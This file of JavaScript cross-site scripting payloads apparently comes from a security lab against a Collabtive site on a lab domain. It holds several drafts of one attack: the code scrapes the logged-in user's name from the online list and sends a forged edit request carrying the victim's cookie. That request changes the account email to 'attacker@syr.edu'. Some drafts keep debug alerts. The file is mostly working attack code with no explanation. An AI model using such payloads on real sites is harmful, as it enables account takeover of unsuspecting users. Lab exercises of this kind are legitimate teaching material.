var Ajax=null;var uname=null;Ajax=new XMLHttpRequest();Ajax.open("POST","http://www.xsslabcollabtive.com/manageuser.php?action=edit",true);Ajax.setRequestHeader("Host","www.xsslabcollabtive.com");Ajax.setRequestHeader("Keep-Alive","300");Ajax.setRequestHeader("Connection","keep-alive");Ajax.setRequestHeader("Cookie",document.cookie);Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");var on=new Ajax.PeriodicalUpdater("onlinelist","manageuser.php?action=onlinelist",{method:'get',onSuccess:function(transport){var div=document.createElement('div');div.innerHTML=transport.responseText;uname=div.firstChild.childNodes[0].childNodes[0].text;div=null;var content="name="+uname+"&email=attacker@syr.edu";Ajax.send(content);},frequency:1000});


var on=new Ajax.PeriodicalUpdater("onlinelist","manageuser.php?action=onlinelist",{method:'get',onSuccess:function(transport){test=transport.responseText;local=test.indexOf('chat-user');tempstr=test.substring(local-130,local-119);num=tempstr.indexOf('>')+1;uname=tempstr.substring(num,tempstr.length);

alert(tempstr);},frequency:1000});


var uname;var test='';var local;var num;var tempstr;var on=new Ajax.PeriodicalUpdater("onlinelist","manageuser.php?action=onlinelist",{method:'get',onSuccess:function(transport){test=transport.responseText;local=test.indexOf('chat-user');tempstr=test.substring(local-130,local-119);num=tempstr.indexOf('>')+1;uname=tempstr.substring(num,tempstr.length);alert(uname);},frequency:1000});setTimeout("on.stop();send();",2000);function send(){var Ajax=null;var uname=null;Ajax=new XMLHttpRequest();Ajax.open("POST","http://www.xsslabcollabtive.com/manageuser.php?action=edit",true);Ajax.setRequestHeader("Host","www.xsslabcollabtive.com");Ajax.setRequestHeader("Keep-Alive","300");Ajax.setRequestHeader("Connection","keep-alive");Ajax.setRequestHeader("Cookie",document.cookie);Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");var content="name="+uname+"&email=attacker@syr.edu";Ajax.send(content);};

var content="name="+uname+"&email=attacker@syr.edu";Ajax.send(content);
